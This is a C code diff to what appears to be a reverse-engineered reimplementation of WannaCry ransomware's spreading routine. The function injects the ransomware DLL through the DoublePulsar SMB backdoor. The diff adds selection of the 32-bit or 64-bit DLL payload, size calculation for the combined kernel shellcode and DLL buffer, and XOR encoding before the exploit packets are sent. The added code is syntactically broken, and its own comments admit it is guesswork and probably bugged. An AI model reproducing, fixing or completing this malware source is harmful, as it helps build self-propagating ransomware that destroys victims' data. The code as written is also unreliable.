@@ -191,25 +191,41 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	64-bit shellcode start address 0x42FA60, size 0x1800 bytes
 	*/
 	const void *rundll_shellcode;
+	char *DLLPayload;
 	int shellcode_payload_size;
 	int DLLSize;
+	int total_size;
 	if(architectureType)
 	{
 		//32 bits
 		shellcode_payload_size = 0x1305; //decimal: 4869
 		DLLSize = 0x4060;
+		DLLPayload = &hDLL_x86;
 	}
 	else
 	{
 		//64 bits
-		shellcode_payload_size = 0x1800; //decimal: 6144;
+		shellcode_payload_size = 0x1800; //decimal: 6144
 		DLLSize = 0xc8a4;
+		DLLPayload = &hDLL_x64;
 	}
 	HGLOBAL hMem = GlobalAlloc(GMEM_ZEROINIT, shellcode_payload_size + DLLSize + 12);
 	
 	//could be wrong but copied from IDA
-	//looks like the DLL
+	//looks like the DLL is added to the hMem location right after the runDLL shellcode
 	memcpy(hMem + shellcode_payload_size, h64_DLL, DLLSize);
+	
+	//not sure what is going on here, but looks like the total_size is getting populated here
+	if (&DLLPayload[shellcode_payload_size] % 4)
+	{
+		 total_size = 4 * DLLPayload[shellcode_payload_size] / 4) + 4;
+	}
+	else
+	{
+		total_size = DLLPayload[shellcode_payload_size];
+	}
+	//end.  This code block is most likely bugged until this is fixed
+	
 	if(architectureType)
 	{
 		//32 bits
@@ -222,7 +238,7 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 		rundll_shellcode = &x64_kernel_shellcode;
 	}
 	memcpy(hMem, rundll_shellcode, shellcode_payload_size);
-	xor_payload(xkey, hMem, UNKNOWN);
+	xor_payload(xkey, hMem, total_size);
 	memcpy(send_buffer, wannacry_trans2_exec_packet, 70);
 	
 	v9 = total_size / 4096;
